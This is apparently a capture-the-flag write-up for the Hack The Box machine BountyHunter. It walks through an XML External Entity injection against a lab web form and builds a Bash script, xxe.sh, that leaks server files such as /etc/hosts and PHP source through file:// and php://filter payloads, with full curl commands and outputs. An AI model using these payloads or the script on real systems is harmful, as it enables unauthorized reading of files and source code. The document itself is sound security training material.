# Hack The Box. Machines. BountyHunter

Machine write-up: https://7rocky.github.io/en/htb/bountyhunter

### `xxe.sh`

This Bash script automates the process of reading files from the server exploiting an XML External Entity (XXE) injection.

There is an XML document that is being send in an AJAX POST request using this JavaScript code:

```js
function returnSecret(data) {
  return Promise.resolve(
    $.ajax({
      type: "POST",
      data: { "data": data },
      url: "tracker_diRbPr00f314.php"
    })
  );
}

async function bountySubmit() {
  try {
    var xml = `<?xml version="1.0" encoding="ISO-8859-1"?>
    <bugreport>
    <title>${$('#exploitTitle').val()}</title>
    <cwe>${$('#cwe').val()}</cwe>
    <cvss>${$('#cvss').val()}</cvss>
    <reward>${$('#reward').val()}</reward>
    </bugreport>`
    let data = await returnSecret(btoa(xml));
    $("#return").html(data)
  } catch(error) {
    console.log('Error:', error);
  }
}
```

Then, we are able to perform the same POST request to the server using `curl`. First, we need to encode the XML document in Base64:

```console
$ data=$(echo "<?xml version=\"1.0\"?>
<bugreport>
  <title>Title</title>
  <cwe>CWE</cwe>
  <cvss>CVSS</cvss>
  <reward>1337</reward>
</bugreport>" | base64); echo $data
PD94bWwgdmVyc2lvbj0iMS4wIj8+ICAKPGJ1Z3JlcG9ydD4KICA8dGl0bGU+VGl0bGU8L3RpdGxlPgogIDxjd2U+Q1dFPC9jd2U+CiAgPGN2c3M+Q1ZTUzwvY3Zzcz4KICA8cmV3YXJkPjEzMzc8L3Jld2FyZD4KPC9idWdyZXBvcnQ+Cg==
```

We cannot send this payload directly, because it contains `+` signs (which are like spaces in URL encoding). Then we need to URL encode the `+` signs (i.e. replacing them by `%2b`). This can be easily done with `sed`:

```console
$ echo "<?xml version=\"1.0\"?>
<bugreport>
  <title>Title</title>
  <cwe>CWE</cwe>
  <cvss>CVSS</cvss>
  <reward>1337</reward>
</bugreport>" | base64 | sed 's/\+/%2b/g'
PD94bWwgdmVyc2lvbj0iMS4wIj8%2bICAgICAgICAgICAgICAgICAgICAgICAgICAgCjxidWdyZXBvcnQ%2bCiAgPHRpdGxlPlRpdGxlPC90aXRsZT4KICA8Y3dlPkNXRTwvY3dlPgogIDxjdnNzPkNWU1M8L2N2c3M%2bCiAgPHJld2FyZD4xMzM3PC9yZXdhcmQ%2bCjwvYnVncmVwb3J0Pgo=
```

Now we can send it with `curl`:

```console
$ curl http://10.10.11.100/tracker_diRbPr00f314.php -d data=PD94bWwgdmVyc2lvbj0iMS4wIj8%2bICAgICAgICAgICAgICAgICAgICAgICAgICAgCjxidWdyZXBvcnQ%2bCiAgPHRpdGxlPlRpdGxlPC90aXRsZT4KICA8Y3dlPkNXRTwvY3dlPgogIDxjdnNzPkNWU1M8L2N2c3M%2bCiAgPHJld2FyZD4xMzM3PC9yZXdhcmQ%2bCjwvYnVncmVwb3J0Pgo=
```

```html
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>Title</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>CWE</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>CVSS</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>1337</td>
  </tr>
</table>
```

At the moment, we are sending this XML document:

```xml
<?xml version="1.0"?>
<bugreport>
  <title>Title</title>
  <cwe>CWE</cwe>
  <cvss>CVSS</cvss>
  <reward>1337</reward>
</bugreport>
```

Since we have full control over the document, we can insert an external entity to retrieve files from the server as follows:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<bugreport>
  <title>&xxe;</title>
  <cwe></cwe>
  <cvss></cvss>
  <reward></reward>
</bugreport>
```

And we see that we get the file `/etc/hosts` inside the `title` tag:

```console
$ curl http://10.10.11.100/tracker_diRbPr0
0f314.php -d data=PD94bWwgdmVyc2lvbj0iMS4wIj8%2bICAgICAgICAKPCFET0NUWVBFIGZvbyBbCiAgPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvaG9zdHMiPgpdPgo8YnVncmVwb3J0PgogIDx0aXRsZT4meHhlOzwvdGl0bGU%2bCiAgPGN3ZT48L2N3ZT4KICA8Y3Zzcz48L2N2c3M%2bCiAgPHJld2FyZD48L3Jld2FyZD4KPC9idWdyZXBvcnQ%2bCg==
```

```html
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>127.0.0.1 localhost
127.0.1.1 bountyhunter

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td></td>
  </tr>
  <tr>
    <td>Score:</td>
    <td></td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td></td>
  </tr>
</table>
```

However, if we need to retrieve a PHP file, it will not be printed because it contains special characters for XML (such as `<` and `>`). To avoid this, we can make use of a PHP wrapper to encode the content in Base64 (`php://filter/convert.base64-encode/resource=`) as follows:

```console
$ echo "<?xml version=\"1.0\"?>
<\!DOCTYPE foo [
  <\!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/log_submit.php\">
]>
<bugreport>
  <title>&xxe;</title>
  <cwe></cwe>
  <cvss></cvss>
  <reward></reward>
</bugreport>" | base64 | sed 's/\+/%2b/g'
PD94bWwgdmVyc2lvbj0iMS4wIj8%2bICAgICAgICAKPCFET0NUWVBFIGZvbyBbCiAgPCFFTlRJVFkgeHhlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2xvZ19zdWJtaXQucGhwIj4KXT4KPGJ1Z3JlcG9ydD4KICA8dGl0bGU%2bJnh4ZTs8L3RpdGxlPgogIDxjd2U%2bPC9jd2U%2bCiAgPGN2c3M%2bPC9jdnNzPgogIDxyZXdhcmQ%2bPC9yZXdhcmQ%2bCjwvYnVncmVwb3J0Pgo=
```

Now we receive a Base64 encoded string:

```
$ curl http://10.10.11.100/tracker_diRbPr00f314.php -d data=PD94bWwgdmVyc2lvbj0iMS4wIj8%2bICAgICAgICAKPCFET0NUWVBFIGZvbyBbCiAgPCFFTlRJVFkgeHhlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2xvZ19zdWJtaXQucGhwIj4KXT4KPGJ1Z3JlcG9ydD4KICA8dGl0bGU%2bJnh4ZTs8L3RpdGxlPgogIDxjd2U%2bPC9jd2U%2bCiAgPGN2c3M%2bPC9jdnNzPgogIDxyZXdhcmQ%2bPC9yZXdhcmQ%2bCjwvYnVncmVwb3J0Pgo=
```

```html
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>PGh0bWw+CjxoZWFkPgo8c2NyaXB0IHNyYz0iL3Jlc291cmNlcy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Ii9yZXNvdXJjZXMvYm91bnR5bG9nLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Y2VudGVyPgo8aDE+Qm91bnR5IFJlcG9ydCBTeXN0ZW0gLSBCZXRhPC9oMT4KPGlucHV0IHR5cGU9InRleHQiIGlkID0gImV4cGxvaXRUaXRsZSIgbmFtZT0iZXhwbG9pdFRpdGxlIiBwbGFjZWhvbGRlcj0iRXhwbG9pdCBUaXRsZSI+Cjxicj4KPGlucHV0IHR5cGU9InRleHQiIGlkID0gImN3ZSIgbmFtZT0iY3dlIiBwbGFjZWhvbGRlcj0iQ1dFIj4KPGJyPgo8aW5wdXQgdHlwZT0idGV4dCIgaWQgPSAiY3ZzcyIgbmFtZT0iZXhwbG9pdENWU1MiIHBsYWNlaG9sZGVyPSJDVlNTIFNjb3JlIj4KPGJyPgo8aW5wdXQgdHlwZT0idGV4dCIgaWQgPSAicmV3YXJkIiBuYW1lPSJib3VudHlSZXdhcmQiIHBsYWNlaG9sZGVyPSJCb3VudHkgUmV3YXJkICgkKSI+Cjxicj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgb25jbGljayA9ICJib3VudHlTdWJtaXQoKSIgdmFsdWU9IlN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPGJyPgo8cCBpZCA9ICJyZXR1cm4iPjwvcD4KPGNlbnRlcj4KPC9odG1sPgo=</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td></td>
  </tr>
  <tr>
    <td>Score:</td>
    <td></td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td></td>
  </tr>
</table>
```

And if we decode the string, we have the contents of the PHP file:

```console
echo PGh0bWw+CjxoZWFkPgo8c2NyaXB0IHNyYz0iL3Jlc291cmNlcy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Ii9yZXNvdXJjZXMvYm91bnR5bG9nLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Y2VudGVyPgo8aDE+Qm91bnR5IFJlcG9ydCBTeXN0ZW0gLSBCZXRhPC9oMT4KPGlucHV0IHR5cGU9InRleHQiIGlkID0gImV4cGxvaXRUaXRsZSIgbmFtZT0iZXhwbG9pdFRpdGxlIiBwbGFjZWhvbGRlcj0iRXhwbG9pdCBUaXRsZSI+Cjxicj4KPGlucHV0IHR5cGU9InRleHQiIGlkID0gImN3ZSIgbmFtZT0iY3dlIiBwbGFjZWhvbGRlcj0iQ1dFIj4KPGJyPgo8aW5wdXQgdHlwZT0idGV4dCIgaWQgPSAiY3ZzcyIgbmFtZT0iZXhwbG9pdENWU1MiIHBsYWNlaG9sZGVyPSJDVlNTIFNjb3JlIj4KPGJyPgo8aW5wdXQgdHlwZT0idGV4dCIgaWQgPSAicmV3YXJkIiBuYW1lPSJib3VudHlSZXdhcmQiIHBsYWNlaG9sZGVyPSJCb3VudHkgUmV3YXJkICgkKSI+Cjxicj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgb25jbGljayA9ICJib3VudHlTdWJtaXQoKSIgdmFsdWU9IlN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPGJyPgo8cCBpZCA9ICJyZXR1cm4iPjwvcD4KPGNlbnRlcj4KPC9odG1sPgo= | base64 -d
```

```php
<html>
<head>
<script src="/resources/jquery.min.js"></script>
<script src="/resources/bountylog.js"></script>
</head>
<center>
<h1>Bounty Report System - Beta</h1>
<input type="text" id = "exploitTitle" name="exploitTitle" placeholder="Exploit Title">
<br>
<input type="text" id = "cwe" name="cwe" placeholder="CWE">
<br>
<input type="text" id = "cvss" name="exploitCVSS" placeholder="CVSS Score">
<br>
<input type="text" id = "reward" name="bountyReward" placeholder="Bounty Reward ($)">
<br>
<input type="submit" onclick = "bountySubmit()" value="Submit" name="submit">
<br>
<p id = "return"></p>
<center>
</html>
```

To automate this, we can create a Bash script that takes the filename as a parameter and puts it inside the XML document and encodes it in Base64 (and making it URL safe). Finally, the POST request is performed using `curl`, as in the examples, and saved to a variable called `res`:

```bash
file=$1

xml="<?xml version=\"1.0\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=$file\">
]>
<bugreport>
  <title>BEGINTAG &xxe; ENDTAG</title>
  <cwe></cwe>
  <cvss></cvss>
  <reward></reward>
</bugreport>
"

data=$(echo $xml | base64 | sed 's/\+/%2b/g')

res=$(curl -sd data=$data http://10.10.11.100/tracker_diRbPr00f314.php)
```

Inside `res`, we will find the response in HTML. To extract the Base64 encoded string, we have used two words (`BEGINTAG` and `ENDTAG`). But first, if the file is not found on the server, the HTML response will not load any data, so we need to check it before:

```bash
ok=$(echo "$res" | grep -E 'BEGINTAG|ENDTAG')

if [ -z "$ok" ]; then
  echo Nothing found
  exit 1
fi
```

And finally, if the file is found, we use the tags mentioned before to extract the Base64 encoded string using `grep` and `sed`. Finally, just decode the string:

```bash
begin=$(echo "$res" | grep -n BEGINTAG | awk -F : '{ print $1 }')
end=$(echo "$res" | grep -n ENDTAG | awk -F : '{ print $1 }')

echo "$res" | sed -n "${begin},${end}p" | sed -E 's/    <td>BEGINTAG | ENDTAG<\/td>//g' | base64 -d
```

The script may be run as follows:

```console
$ bash xxe.sh /etc/hosts
127.0.0.1 localhost
127.0.1.1 bountyhunter
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
